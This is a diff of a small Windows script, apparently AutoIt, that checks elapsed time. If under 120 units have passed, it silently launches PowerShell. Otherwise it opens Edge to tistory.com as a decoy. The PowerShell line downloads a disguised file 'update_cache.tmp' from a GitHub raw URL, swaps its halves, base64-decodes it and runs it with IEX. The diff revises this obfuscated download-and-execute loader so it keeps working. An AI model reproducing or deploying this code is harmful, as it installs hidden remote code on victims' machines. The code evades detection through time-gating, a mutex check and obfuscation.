@@ -5,7 +5,7 @@ b3 := DateDiff(b1, b2)
 
 if( b3 < 120 )
 {
-   ShellRun("powershell.exe", "try{[System.Threading.Mutex]::OpenExisting('ms_assistant_Mutex').Close();return}catch{};$data=Invoke-RestMethod 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp';$m=[math]::Ceiling($data.Length/2);$s=$data.Substring($m)+$data.Substring(0,$m);$b=[System.Convert]::FromBase64String($s);$c=[System.Text.Encoding]::UTF8.GetString($b);IEX $c" . "", "", "", 0)
+   ShellRun("powershell.exe", "try{[System.Threading.Mutex]::OpenExisting('ms_assistant_Mutex').Close();return}catch{};$c=Invoke-RestMethod 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp';$c=$c -replace '\s','';$l=$c.Length;$m=[math]::Ceiling($l/2);$b=[Convert]::FromBase64String($c.Substring($m)+$c.Substring(0,$m));$s=[Text.Encoding]::UTF8.GetString($b);IEX $s" . "", "", "", 0)
 }else
 {
     ShellRun("msedge.exe", "https://tistory.com", "", "", 0)
